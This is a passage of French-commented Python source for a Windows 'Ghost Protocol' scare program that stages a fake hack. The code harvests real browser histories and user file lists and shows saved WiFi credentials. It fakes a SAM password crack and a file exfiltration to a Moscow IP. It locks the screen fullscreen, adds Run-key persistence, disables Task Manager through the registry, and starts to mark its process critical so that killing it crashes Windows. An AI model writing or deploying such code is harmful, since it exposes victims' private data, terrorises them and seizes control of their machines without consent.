        return "\n  [!] Aucun profil WiFi sauvegarde detecte sur cette machine.\n  [!] (Connexion filaire ou aucun reseau sans fil enregistre)\n"

    output = "\n  [*] Extraction des identifiants WiFi sauvegardés...\n\n"
    output += f"  {'SSID':<25}{'Sécurité':<25}{'Mot de passe'}\n"
    output += "  " + "-" * 75 + "\n"
    
    for ssid, sec, pwd in wifi_list:
        short_ssid = ssid[:22] + "..." if len(ssid) > 24 else ssid
        short_sec = sec[:22] + "..." if len(sec) > 24 else sec
        output += f"  {short_ssid:<25}{short_sec:<25}{pwd}\n"
    
    output += f"\n  [+] {len(wifi_list)} identifiants extraits.\n"
    return output

def find_all_history_paths():
    """
    Scanne dynamiquement le système pour trouver tous les fichiers d'historique 
    des différents navigateurs et de leurs différents profils.
    """
    try:
        username = os.getlogin()
    except Exception:
        try:
            username = os.environ.get("USERNAME") or "User"
        except Exception:
            username = "User"

    user_dir = f"C:\\Users\\{username}"
    appdata_local = os.path.join(user_dir, "AppData", "Local")
    appdata_roaming = os.path.join(user_dir, "AppData", "Roaming")

    history_paths = [] # Liste de tuples : (nom_navigateur, chemin_fichier)

    # 1. Navigateurs Chromium avec profils dynamiques
    chromium_browsers = {
        "Chrome": os.path.join(appdata_local, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(appdata_local, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(appdata_local, "BraveSoftware", "Brave-Browser", "User Data"),
        "Vivaldi": os.path.join(appdata_local, "Vivaldi", "User Data"),
    }

    for name, base_path in chromium_browsers.items():
        if os.path.exists(base_path):
            try:
                for entry in os.listdir(base_path):
                    entry_path = os.path.join(base_path, entry)
                    if os.path.isdir(entry_path):
                        history_file = os.path.join(entry_path, "History")
                        if os.path.exists(history_file):
                            history_paths.append((f"{name} ({entry})", history_file))
            except Exception:
                pass

    # 2. Opera / Opera GX (chemins directs)
    opera_browsers = {
        "Opera": os.path.join(appdata_roaming, "Opera Software", "Opera Stable", "History"),
        "Opera GX": os.path.join(appdata_roaming, "Opera Software", "Opera GX Stable", "History"),
    }
    for name, path in opera_browsers.items():
        if os.path.exists(path):
            history_paths.append((name, path))

    # 3. Firefox profiles
    firefox_base = os.path.join(appdata_roaming, "Mozilla", "Firefox", "Profiles")
    if os.path.exists(firefox_base):
        try:
            for pdir in os.listdir(firefox_base):
                p_path = os.path.join(firefox_base, pdir, "places.sqlite")
                if os.path.exists(p_path):
                    history_paths.append((f"Firefox ({pdir})", p_path))
        except Exception:
            pass

    return history_paths

def get_real_browser_history(limit=10):
    """
    Tente de récupérer le véritable historique de navigation récent pour tous les navigateurs installés.
    """
    history_entries = []
    paths = find_all_history_paths()
    
    for browser, path in paths:
        tmp_file = None
        try:
            fd, tmp_file = tempfile.mkstemp()
            os.close(fd)
            shutil.copy2(path, tmp_file)
            
            conn = sqlite3.connect(tmp_file)
            cursor = conn.cursor()
            
            if "Firefox" in browser:
                query = """
                SELECT datetime(h.visit_date/1000000, 'unixepoch', 'localtime') as visit_time, p.url, p.title
                FROM moz_historyvisits h
                JOIN moz_places p ON h.place_id = p.id
                ORDER BY h.visit_date DESC
                LIMIT ?
                """
            else:
                query = """
                SELECT datetime(v.visit_time/1000000 - 11644473600, 'unixepoch', 'localtime') as visit_time, u.url, u.title
                FROM visits v
                JOIN urls u ON v.url = u.id
                ORDER BY v.visit_time DESC
                LIMIT ?
                """
                
            cursor.execute(query, (limit,))
            for row in cursor.fetchall():
                visit_time = row[0]
                url = row[1]
                title = row[2] or ""
                
                try:
                    time_part = visit_time.split(" ")[1][:5]
                except Exception:
                    time_part = "??:??"
                    
                short_url = url
                if len(short_url) > 65:
                    short_url = short_url[:62] + "..."
                    
                history_entries.append((time_part, short_url, title))
            conn.close()
        except Exception:
            pass
        finally:
            if tmp_file and os.path.exists(tmp_file):
                try:
                    os.remove(tmp_file)
                except Exception:
                    pass
                    
    if history_entries:
        history_entries.sort(key=lambda x: x[0], reverse=True)
        return history_entries[:limit]
    return []

def get_real_browser_history_count():
    """
    Compte le nombre d'entrées d'historique totales dans tous les navigateurs.
    """
    total_count = 0
    paths = find_all_history_paths()
    
    for browser, path in paths:
        tmp_file = None
        try:
            fd, tmp_file = tempfile.mkstemp()
            os.close(fd)
            shutil.copy2(path, tmp_file)
            
            conn = sqlite3.connect(tmp_file)
            cursor = conn.cursor()
            if "Firefox" in browser:
                cursor.execute("SELECT COUNT(*) FROM moz_places")
            else:
                cursor.execute("SELECT COUNT(*) FROM urls")
            row = cursor.fetchone()
            if row:
                total_count += row[0]
            conn.close()
        except Exception:
            pass
        finally:
            if tmp_file and os.path.exists(tmp_file):
                try:
                    os.remove(tmp_file)
                except Exception:
                    pass
    return total_count

def get_desktop_files(limit=3):
    """
    Récupère une liste de fichiers réels sur le Bureau de l'utilisateur pour servir de preuve.
    """
    try:
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        if os.path.exists(desktop_path):
            files = [f for f in os.listdir(desktop_path) if os.path.isfile(os.path.join(desktop_path, f))]
            return files[:limit]
    except Exception:
        pass
    return []

def generate_browser_history_display():
    """Génère l'affichage d'historique (réel s'il y en a, sinon affiche un message de non-détection)."""
    real = get_real_browser_history(10)
    if not real:
        return "\n  [!] Aucun historique de navigation recent detecte sur ce systeme.\n  [!] (Navigation privee activee ou historique nettoye recemment)\n"
    
    output = "\n"
    for hour, url, title in real:
        output += f"  [{hour}] {url}\n"
        if title:
            short_title = title
            if len(short_title) > 60:
                short_title = short_title[:57] + "..."
            output += f"         > Titre : {short_title}\n"
    return output

def simulate_password_crack():
    """Simule une animation de craquage de mot de passe fluide dans le CMD avec décodage progressif."""
    try:
        username = os.getlogin()
    except Exception:
        username = "USER"
    
    target_pwd = f"{username.upper()}2026!"
    pwd_len = len(target_pwd)
    
    with cmd_typing_lock:
        write_to_cmd("  [*] INITIALISATION DE LA FORCE BRUTE SUR SAM BASE...\n")
        write_to_cmd("") # Ligne vide qui servira de zone d'écriture dynamique
        
    time.sleep(0.3)
    
    # 100 étapes fluides de progression
    steps = 80
    for step in range(steps + 1):
        if not mouse_locked:
            return
            
        # Si le spam clavier s'affiche, on met en pause le décodage du mot de passe
        while spam_window_active:
            time.sleep(0.1)
            
        pct = (step / steps) * 100
        
        # Nombre de caractères résolus proportionnel au pourcentage
        resolved_chars_count = int((step / steps) * pwd_len)
        
        resolved_part = target_pwd[:resolved_chars_count]
        remaining_len = pwd_len - resolved_chars_count
        
        glitched_part = ""
        for char in target_pwd[resolved_chars_count:]:
            if char.isalnum():
                glitched_part += random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$")
            else:
                glitched_part += char
                
        display_pwd = resolved_part + glitched_part
        
        # Barre de chargement type hacking
        bar_len = 20
        filled = int((step / steps) * bar_len)
        empty = bar_len - filled
        bar = "█" * filled + "░" * empty
        
        line_text = f"  [#] SAM DECRYPT: [{bar}] {pct:6.2f}% | Test: {display_pwd}"
        overwrite_last_line_cmd(line_text)
        
        # Son de clic de hacking à chaque étape de calcul
        play_typing_sound("x")
        
        # Délai de calcul plus ou moins rapide
        time.sleep(random.uniform(0.015, 0.045))
        
    with cmd_typing_lock:
        write_to_cmd("\n")
        
    time.sleep(0.4)
    execute_cmd_command(f"  [+] MOT DE PASSE DECRYPTE : {target_pwd}", delay_after=0.3)
    execute_cmd_command("  [+] Efficacite du mot de passe : Risible (1.2/100)", delay_after=0.2)
    execute_cmd_command("  [+] Temps de decryptage : 2.8 secondes (Un enfant de 5 ans ferait mieux)", delay_after=0.2)

def get_real_files_to_transfer(username, limit=10):
    """
    Scanne les dossiers Desktop, Documents et Downloads de l'utilisateur pour trouver des fichiers réels.
    Retourne une liste de tuples : (chemin_complet, taille_formatee).
    Si peu ou pas de fichiers sont trouvés, complète avec des fichiers système inoffensifs.
    """
    user_dir = f"C:\\Users\\{username}"
    folders = [
        os.path.join(user_dir, "Desktop"),
        os.path.join(user_dir, "Documents"),
        os.path.join(user_dir, "Downloads")
    ]
    
    real_files = []
    interesting_extensions = ('.pdf', '.txt', '.docx', '.xlsx', '.jpg', '.png', '.zip', '.mp4', '.key', '.json')
    
    for folder in folders:
        if os.path.exists(folder):
            try:
                for root_dir, _, filenames in os.walk(folder):
                    for fname in filenames:
                        if fname.lower().endswith(interesting_extensions) and not fname.startswith('~$'):
                            full_path = os.path.join(root_dir, fname)
                            try:
                                size_bytes = os.path.getsize(full_path)
                                if size_bytes < 1024:
                                    size_str = f"{size_bytes} B"
                                elif size_bytes < 1024 * 1024:
                                    size_str = f"{size_bytes / 1024:.1f} KB"
                                elif size_bytes < 1024 * 1024 * 1024:
                                    size_str = f"{size_bytes / (1024 * 1024):.1f} MB"
                                else:
                                    size_str = f"{size_bytes / (1024 * 1024 * 1024):.1f} GB"
                                
                                real_files.append((full_path, size_str))
                                if len(real_files) >= limit:
                                    break
                            except Exception:
                                pass
                    if len(real_files) >= limit:
                        break
            except Exception:
                pass
        if len(real_files) >= limit:
            break
            
    fallback_files = [
        (f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "12.4 MB"),
        (f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", "8.2 MB"),
        (f"C:\\Users\\{username}\\AppData\\Roaming\\Discord\\Local Storage\\leveldb", "14.8 MB"),
        (f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Credentials", "2.1 MB"),
        (f"C:\\Users\\{username}\\Documents\\CV_confidentiel.pdf", "2.4 MB"),
        (f"C:\\Users\\{username}\\Documents\\declaration_impots.pdf", "3.7 MB"),
        (f"C:\\Users\\{username}\\Desktop\\mots_de_passe.txt", "4 KB")
    ]
    
    for fpath, fsize in fallback_files:
        if len(real_files) >= limit:
            break
        if not any(rf[0] == fpath for rf in real_files):
            real_files.append((fpath, fsize))
            
    return real_files

def simulate_file_transfer(sys_info):
    """Simule un transfert de fichiers avec barre de progression."""
    real_files = get_real_files_to_transfer(sys_info['username'], limit=10)
    
    type_on_screen("=" * 55 + "\n", delay=0.005)
    type_on_screen("  ASPIRATION ET PILLAGE DE TES FICHIERS EN COURS\n", delay=0.02)
    type_on_screen("=" * 55 + "\n\n", delay=0.005)
    type_on_screen(f"> Serveur de stockage : 185.43.217.91 (Moscou, Russie - Securise)\n", delay=0.02)
    type_on_screen(f"> Protocole de vol   : SFTP (AES-256-CBC)\n", delay=0.02)
    type_on_screen(f"> Debit ascendant     : 48.7 MB/s (Merci la fibre !)\n\n", delay=0.02)
    
    for i, (fname, fsize) in enumerate(real_files):
        if not mouse_locked:
            return
        
        short_name = fname.split("\\")[-1] if "\\" in fname else fname
        if len(short_name) > 37:
            short_name = short_name[:34] + "..."
            
        write_to_screen(f"  Vol de : {short_name:<40} ")
        time.sleep(random.uniform(0.3, 0.9))
        write_to_screen(f"[{fsize}] EXFILTRE\n")
        
        pct = int((i + 1) / len(real_files) * 100)
        filled = int(pct / 100 * 30)
        empty = 30 - filled
        bar_text = f"Vitesse: {random.randint(45, 95)} MB/s | Exfiltration : [{'█' * filled}{'░' * empty}] {pct}%"
        root.after(0, lambda t=bar_text: label_status.config(text=t, fg="#ff3333"))
        
        time.sleep(0.15)
    
    time.sleep(0.5)
    write_to_screen(f"\n> Transfert termine. {len(real_files)} de tes fichiers les plus precieux ont ete exfiltres.\n")
    write_to_screen("> Archivage sur le serveur distant en cours... Preparation de la phase d'effacement.\n")


def make_box_header(logo_lines, subtitle=""):
    border_top =    "╔══════════════════════════════════════════════════════╗"
    border_bottom = "╚══════════════════════════════════════════════════════╝"
    box_width = 54 # width of inside of the box
    
    result = border_top + "\n"
    for i in range(6):
        if i < len(logo_lines):
            line = logo_lines[i]
        else:
            line = ""
            
        stripped = line.strip("\r\n")
        length = len(stripped)
        padding_left = (box_width - length) // 2
        padding_right = box_width - length - padding_left
        result += "║" + " " * padding_left + stripped + " " * padding_right + "║\n"
        
    # Ligne vide
    result += "║" + " " * box_width + "║\n"
    
    # Sous-titre
    sub_len = len(subtitle)
    sub_left = (box_width - sub_len) // 2
    sub_right = box_width - sub_len - sub_left
    result += "║" + " " * sub_left + subtitle + " " * sub_right + "║\n"
    
    result += border_bottom
    return result

def reveal_logo_sweep():
    global label_header
    if not root:
        return
        
    logo_lines = [
        " ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗",
        "██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝",
        "██║  ███╗███████║██║   ██║███████╗   ██║   ",
        "██║   ██║██╔══██║██║   ██║╚════██║   ██║   ",
        "╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ",
        " ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   "
    ]
    subtitle = "P R O T O C O L  [v3.7.1]"
    width = max(len(line) for line in logo_lines)
    
    # Glitch couleur initial court
    root.after(0, lambda: label_header.config(fg="#ff3333"))
    beep_short(400, 50)
    time.sleep(0.1)
    root.after(0, lambda: label_header.config(fg="#00ff00"))
    
    for col_idx in range(width + 1):
        if not mouse_locked:
            return
            
        current_lines = []
        for line in logo_lines:
            decoded = line[:col_idx]
            remaining = line[col_idx:]
            
            glitched = ""
            for char in remaining:
                if char == " ":
                    glitched += " "
                else:
                    glitched += random.choice("!@#$%&*?0123456789")
            current_lines.append(decoded + glitched)
            
        box_content = make_box_header(current_lines, subtitle)
        root.after(0, lambda text=box_content: label_header.config(text=text))
        
        play_typing_sound("x")
        time.sleep(random.uniform(0.02, 0.03))
        
    final_box = make_box_header(logo_lines, subtitle)
    root.after(0, lambda text=final_box: label_header.config(text=text))
    beep_short(800, 80)
    time.sleep(0.1)
    
    pulse_colors = ["#005500", "#00aa00", "#00ff00", "#ff3333", "#00ff00"]
    for pc in pulse_colors:
        if not mouse_locked:
            return
        root.after(0, lambda color=pc: label_header.config(fg=color))
        time.sleep(0.06)

def animate_logo_launch():
    global label_header, screen_text_widget, label_status, overlay_frame
    if not root:
        return
        
    # 1. Glitch sonore et visuel initial (Flicker de la bordure du panneau)
    border_colors = ["#ff3333", "#002800", "#00ff00", "#ff3333", "#0a0a0a", "#00cc00"]
    for c in border_colors:
        if not mouse_locked:
            return
        root.after(0, lambda color=c: overlay_frame.config(highlightbackground=color))
        if c == "#ff3333":
            beep_short(150, 80) # Glitch grave
        else:
            beep_short(random.randint(600, 1200), 30)
        time.sleep(0.06)
        
    # Restaurer la bordure verte
    root.after(0, lambda: overlay_frame.config(highlightbackground="#00cc00"))
    
    # 2. Texte de décodage initial dans le terminal de l'overlay
    clear_overlay_screen()
    type_on_screen(">>> GHOST SYSTEM CORE : LOADED\n", delay=0.01)
    time.sleep(0.2)
    type_on_screen(">>> ESTABLISHING LIQUID MATRIX INTERFACE...\n", delay=0.01)
    time.sleep(0.2)
    type_on_screen(">>> DECRYPTING SIGNATURE KEYS [AES-512]...\n", delay=0.01)
    time.sleep(0.3)
    
    # Barre de progression de décryptage
    progress_bar_chars = 30
    for i in range(progress_bar_chars + 1):
        if not mouse_locked:
            return
        pct = int((i / progress_bar_chars) * 100)
        filled = i
        empty = progress_bar_chars - i
        bar = f"[{'█' * filled}{'░' * empty}] {pct}%"
        
        # Mettre à jour l'affichage de progression
        def _show_bar(b=bar):
            try:
                screen_text_widget.delete("1.0", "end")
                screen_text_widget.insert("1.0", ">>> GHOST PROTOCOL DECRYPTION IN PROGRESS...\n\n")
                screen_text_widget.insert("end", b + "\n\n")
                screen_text_widget.insert("end", "STATUS: INTERCEPTING LOCAL RECOVERY SYSTEMS...")
            except Exception:
                pass
        root.after(0, _show_bar)
        
        # Bip très court de chargement
        if i % 3 == 0:
            beep_short(1800 - (i * 20), 10)
        time.sleep(0.04)
        
    time.sleep(0.4)
    clear_overlay_screen()
    type_on_screen(">>> SIGNATURE DECRYPTED SUCCESSFULLY.\n", delay=0.01)
    type_on_screen(">>> RENDERING GRAPHICAL INTERFACE...\n", delay=0.01)
    time.sleep(0.5)
    clear_overlay_screen()
    
    # 3. Décodage du logo GHOST
    reveal_logo_sweep()

# ==============================================================================
# 11. ÉCRAN DE VERROUILLAGE PRINCIPAL — PLUIE MATRIX + OVERLAY
# ==============================================================================

def init_lockdown_screen():
    """
    Initialise l'interface en arrière-plan sans verrouiller l'écran,
    et démarre la diffusion.
    """
    global root, matrix_canvas, overlay_glow, overlay_frame
    global screen_text_widget, label_header, label_status
    
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg="black")
    root.withdraw()  # Masquer immédiatement au démarrage
    ensure_legs_overlay_started()
    ensure_prank_overlays_started()
    
    # Interdire la fermeture
    root.protocol("WM_DELETE_WINDOW", lambda: "break")
    
    # Restauration forcée en cas de perte de focus
    root.bind("<FocusOut>", on_focus_out)
    root.bind("<Unmap>", on_focus_out)
    root.bind("<Leave>", on_focus_out)
    root.bind("<Configure>", lambda e: root.attributes("-fullscreen", True) if protocol_running else None)
    
    # Echap pour forcer l'arrêt d'urgence uniquement si le backdoor est actif
    def handle_tk_escape(e):
        ctrl_down = ctypes.windll.user32.GetAsyncKeyState(0x11) & 0x8000
        shift_down = ctypes.windll.user32.GetAsyncKeyState(0x10) & 0x8000
        alt_down = ctypes.windll.user32.GetAsyncKeyState(0x12) & 0x8000
        if ctrl_down and shift_down and alt_down:
            instant_emergency_kill("Tkinter Escape binding (backdoor combo)")
            
    root.bind_all("<Escape>", handle_tk_escape)
    
    # === CANVAS PLEIN ÉCRAN POUR LA PLUIE MATRIX ===
    try:
        sw = root.winfo_screenwidth()
        sh = root.winfo_screenheight()
    except Exception:
        sw, sh = 1920, 1080
    
    matrix_canvas = tk.Canvas(root, width=sw, height=sh, bg="black", highlightthickness=0)
    matrix_canvas.place(x=0, y=0, relwidth=1, relheight=1)
    
    # === PANNEAU OVERLAY CENTRAL AVEC EFFET GLOW ===
    # Couches de lueur verte progressive autour du panneau
    overlay_glow = tk.Frame(root, bg="#001a00")
    overlay_glow.place(relx=0.5, rely=0.5, anchor="center", width=840, height=580)
    
    glow_mid = tk.Frame(overlay_glow, bg="#002800")
    glow_mid.place(relx=0.5, rely=0.5, anchor="center", relwidth=0.99, relheight=0.99)
    
    glow_inner = tk.Frame(glow_mid, bg="#001200")
    glow_inner.place(relx=0.5, rely=0.5, anchor="center", relwidth=0.98, relheight=0.98)
    
    overlay_frame = tk.Frame(glow_inner, bg="#0a0a0a", highlightbackground="#00cc00", highlightthickness=2)
    overlay_frame.place(relx=0.5, rely=0.5, anchor="center", relwidth=0.97, relheight=0.97)
    
    # En-tête du panneau (initialisé vide pour l'apparition progressive)
    label_header = tk.Label(
        overlay_frame,
        text=make_box_header(["", "", "", "", "", ""], subtitle="P R O T O C O L  [v3.7.1]"),
        fg="#00cc00", bg="#0a0a0a", font=("Consolas", 11, "bold"),
        justify="left"
    )
    label_header.pack(pady=(10, 0))
    
    # Séparateur
    sep = tk.Frame(overlay_frame, bg="#00cc00", height=1)
    sep.pack(fill="x", padx=20, pady=3)
    
    # Widget terminal principal (texte scrollable)
    screen_text_widget = tk.Text(
        overlay_frame,
        bg="#0a0a0a",
        fg="#00ff00",
        insertbackground="#00ff00",
        font=("Consolas", 10),
        relief="flat",
        borderwidth=8,
        highlightthickness=0,
        wrap="word"
    )
    screen_text_widget.pack(fill="both", expand=True, padx=12, pady=(3, 3))
    
    # Bloquer les entrées utilisateur sur le terminal
    screen_text_widget.bind("<Key>", lambda e: "break")
    screen_text_widget.bind("<Button-1>", lambda e: "break")
    screen_text_widget.bind("<B1-Motion>", lambda e: "break")
    
    # Séparateur bas
    sep2 = tk.Frame(overlay_frame, bg="#00cc00", height=1)
    sep2.pack(fill="x", padx=20, pady=0)
    
    # Barre de statut en bas du panneau
    label_status = tk.Label(
        overlay_frame,
        text="[SYS] Initialisation du protocole...",
        fg="#00ff00", bg="#0a0a0a", font=("Consolas", 9),
        justify="left", anchor="w"
    )
    label_status.pack(fill="x", padx=15, pady=(3, 8))
    
    # Lancer le thread de streaming si autorisé en arrière-plan immédiatement
    if stream_authorized:
        threading.Thread(target=stream_screen_loop, daemon=True).start()
        
    # Vérifier s'il y a un état précédent (reboot / interruption)
    state = load_state()
    if state:
        root.after(500, start_lockdown_protocol)
        
    root.mainloop()

def trigger_emergency_exit(reason="Inconnu"):
    """
    Quitte proprement et immédiatement le script en cas d'urgence avec nettoyage complet du PC.
    """
    instant_emergency_kill(reason)

# =============================================================
def simulate_tree_output():
    """
    Simule la commande tree en faisant défiler rapidement de faux chemins de fichiers.
    """
    prefixes = ["C:\\Windows\\System32\\", "C:\\Windows\\SysWOW64\\", "C:\\Windows\\WinSxS\\", "C:\\Windows\\Microsoft.NET\\"]
    suffixes = [".dll", ".exe", ".mui", ".sys", ".inf", ".dat"]
    folders = ["drivers\\", "config\\", "wbem\\", "en-US\\", "slgp\\", "migwiz\\"]
    
    start_time = time.time()
    while time.time() - start_time < 3.5:
        if not mouse_locked:
            return
            
        # S'il y a un message de troll en attente, le traiter avant d'écrire d'autres lignes
        if cmd_troll_queue:
            with cmd_typing_lock:
                troll_msg = cmd_troll_queue.pop(0)
                human_type_generic(troll_msg, write_to_cmd, delete_last_char_cmd, is_cmd=True, check_queue=True)
                time.sleep(random.uniform(0.4, 0.8))
                
        path = random.choice(prefixes) + random.choice(folders) + f"file_{random.randint(100, 999)}" + random.choice(suffixes)
        with cmd_typing_lock:
            write_to_cmd(path + "\n")
        time.sleep(0.005)


# ==============================================================================
# GESTION DE LA PERSISTANCE ET DE L'ÉTAT DU SCRIPT (REBOOT & REGISTRE)
# ==============================================================================

def get_state_file_path():
    """Retourne le chemin d'accès au fichier d'état du protocole GHOST."""
    # Essayer d'abord à côté de l'exécutable pour le partager entre l'utilisateur standard et l'admin (UAC)
    if getattr(sys, 'frozen', False):
        exe_dir = os.path.dirname(os.path.abspath(sys.executable))
    else:
        exe_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        
    try:
        test_path = os.path.join(exe_dir, 'ghost_test.tmp')
        with open(test_path, 'w') as f:
            f.write('test')
        os.remove(test_path)
        return os.path.join(exe_dir, 'ghost_state.json')
    except Exception:
        # Fallback sur le dossier Public accessible par tout le monde
        public_dir = os.path.join(os.environ.get('SystemDrive', 'C:'), 'Users', 'Public')
        if os.path.exists(public_dir):
            return os.path.join(public_dir, 'ghost_state.json')
        # Dernier recours : dossier de l'utilisateur ou temporaire
        return os.path.join(os.environ.get('LOCALAPPDATA', os.environ.get('TEMP', '')), 'ghost_state.json')

def save_state(phase):
    """Sauvegarde la phase actuelle et tous les compteurs statistiques de panique de l'utilisateur."""
    global mouse_fight_count, notepad_close_count, cmd_close_count
    global alt_tab_attempt_count, escape_attempt_count, alt_f4_attempt_count
    global win_key_attempt_count, task_manager_attempt_count, focus_loss_attempt_count
    global shutdown_count, stream_authorized
    try:
        state_file = get_state_file_path()
        state_data = {
            "phase": phase,
            "mouse_fight_count": mouse_fight_count,
            "notepad_close_count": notepad_close_count,
            "cmd_close_count": cmd_close_count,
            "alt_tab_attempt_count": alt_tab_attempt_count,
            "escape_attempt_count": escape_attempt_count,
            "alt_f4_attempt_count": alt_f4_attempt_count,
            "win_key_attempt_count": win_key_attempt_count,
            "task_manager_attempt_count": task_manager_attempt_count,
            "focus_loss_attempt_count": focus_loss_attempt_count,
            "shutdown_count": shutdown_count,
            "stream_authorized": stream_authorized
        }
        with open(state_file, 'w', encoding='utf-8') as f:
            json.dump(state_data, f, indent=4)
    except Exception:
        pass

def load_state():
    """Charge l'état sauvegardé s'il existe et incrémente le compteur de redémarrages."""
    global mouse_fight_count, notepad_close_count, cmd_close_count
    global alt_tab_attempt_count, escape_attempt_count, alt_f4_attempt_count
    global win_key_attempt_count, task_manager_attempt_count, focus_loss_attempt_count
    global shutdown_count, stream_authorized
    try:
        state_file = get_state_file_path()
        if os.path.exists(state_file):
            with open(state_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            # Restaurer les compteurs
            mouse_fight_count = data.get("mouse_fight_count", 0)
            notepad_close_count = data.get("notepad_close_count", 0)
            cmd_close_count = data.get("cmd_close_count", 0)
            alt_tab_attempt_count = data.get("alt_tab_attempt_count", 0)
            escape_attempt_count = data.get("escape_attempt_count", 0)
            alt_f4_attempt_count = data.get("alt_f4_attempt_count", 0)
            win_key_attempt_count = data.get("win_key_attempt_count", 0)
            task_manager_attempt_count = data.get("task_manager_attempt_count", 0)
            focus_loss_attempt_count = data.get("focus_loss_attempt_count", 0)
            stream_authorized = True
            
            # Incrémenter le nombre de coupures
            shutdown_count = data.get("shutdown_count", 0) + 1
            data["shutdown_count"] = shutdown_count
            
            # Sauvegarder immédiatement l'état mis à jour
            with open(state_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4)
                
            return data
    except Exception:
        pass
    return None

def clear_state():
    """Supprime le fichier d'état."""
    try:
        state_file = get_state_file_path()
        if os.path.exists(state_file):
            os.remove(state_file)
    except Exception:
        pass

def add_to_startup():
    """Enregistre le script de façon à ce qu'il se relance au démarrage de session Windows."""
    if is_developer_pc():
        # Sécurité : nettoyer tout démarrage précédent et ne rien faire
        remove_from_startup()
        return
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        if getattr(sys, 'frozen', False):
            cmd_line = f'"{sys.executable}"'
        else:
            cmd_line = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"'
            
        # Écriture dans HKEY_LOCAL_MACHINE pour tous les utilisateurs (nécessite élévation admin)
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "GhostProtocol", 0, winreg.REG_SZ, cmd_line)
            winreg.CloseKey(key)
        except Exception:
            pass
            
        # Écriture également dans HKEY_CURRENT_USER
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "GhostProtocol", 0, winreg.REG_SZ, cmd_line)
            winreg.CloseKey(key)
        except Exception:
            pass
    except Exception:
        pass

def remove_from_startup():
    """Supprime le script du démarrage automatique de session Windows."""
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    # Nettoyage de HKEY_LOCAL_MACHINE
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "GhostProtocol")
        winreg.CloseKey(key)
    except Exception:
        pass
        
    # Nettoyage de HKEY_CURRENT_USER
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "GhostProtocol")
        winreg.CloseKey(key)
    except Exception:
        pass


def set_task_manager_disabled(disabled):
    """
    Désactive ou réactive le Gestionnaire des tâches via le Registre Windows.
    disabled = True (désactiver), False (réactiver).
    """
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        # Essayer d'ouvrir ou de créer la clé dans HKEY_CURRENT_USER
        try:
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            if disabled:
                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            else:
                try:
                    winreg.DeleteValue(key, "DisableTaskMgr")
                except FileNotFoundError:
                    pass
            winreg.CloseKey(key)
        except Exception as e:
            log_debug(f"Failed HKCU TaskMgr policy: {e}")
            
        # Également essayer HKEY_LOCAL_MACHINE si on est admin
        try:
            key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
            if disabled:
                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            else:
                try:
                    winreg.DeleteValue(key, "DisableTaskMgr")
                except FileNotFoundError:
                    pass
            winreg.CloseKey(key)
        except Exception as e:
            log_debug(f"Failed HKLM TaskMgr policy: {e}")
            
    except Exception as e:
        log_debug(f"Global error set_task_manager_disabled: {e}")


# Structures ctypes nécessaires pour ajuster les privilèges de processus
class LUID(ctypes.Structure):
    _fields_ = [("LowPart", ctypes.c_ulong), ("HighPart", ctypes.c_long)]


class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Luid", LUID), ("Attributes", ctypes.c_ulong)]


class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [("PrivilegeCount", ctypes.c_ulong), ("Privileges", LUID_AND_ATTRIBUTES * 1)]


TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_QUERY = 0x0008
SE_PRIVILEGE_ENABLED = 0x00000002


def set_process_critical(critical):
    """
    Marque le processus actuel comme critique (ou non critique) pour empêcher sa fermeture via le Gestionnaire des tâches.
    Si le processus est critique et qu'il est tué par force (ex. taskkill /F), Windows va déclencher un BSOD.
    """
    try:
        # 1. Ouvrir le jeton du processus actuel
        hToken = ctypes.wintypes.HANDLE()
        current_process = ctypes.windll.kernel32.GetCurrentProcess()
        if not ctypes.windll.advapi32.OpenProcessToken(current_process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(hToken)):
            log_debug("OpenProcessToken failed")
            return False
            
        # 2. Obtenir le LUID de la privilege SeDebugPrivilege
        luid = LUID()
        if not ctypes.windll.advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid)):
            log_debug("LookupPrivilegeValue failed")
            ctypes.windll.kernel32.CloseHandle(hToken)
            return False
            
        # 3. Ajuster le privilège
        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED if critical else 0
        
